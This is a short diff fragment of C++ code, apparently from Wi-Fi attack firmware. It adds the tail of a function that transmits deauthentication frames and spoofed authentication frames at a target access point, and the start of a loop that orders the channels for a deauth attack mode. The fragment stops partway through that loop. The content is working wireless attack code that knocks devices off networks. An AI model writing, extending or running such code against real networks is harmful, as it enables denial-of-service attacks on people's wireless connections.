@@ -57,3 +57,21 @@ static uint32_t _sendDeauthPulseForTarget(uint8_t* bssid, const char* ssid, bool
     if (wifi_tx_deauth_frame(bssid, kBcastMac, reason)) sent++;
     if (wifi_tx_auth_frame(rand_mac, bssid)) sent++;
 
+    return sent;
+}
+
+static void _runDeauthLoop() {
+    std::vector<int> target_channels;
+    target_channels.reserve(g_deauth_channels.size());
+    for (const auto& entry : g_deauth_channels) {
+        if (!is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
+    }
+    for (const auto& entry : g_deauth_channels) {
+        if (is5GhzChannel(entry.first)) target_channels.push_back(entry.first);
+    }
+
+    if (target_channels.empty()) {
+        g_app.attack_mode = AttackMode::IDLE;
+        return;
+    }
+
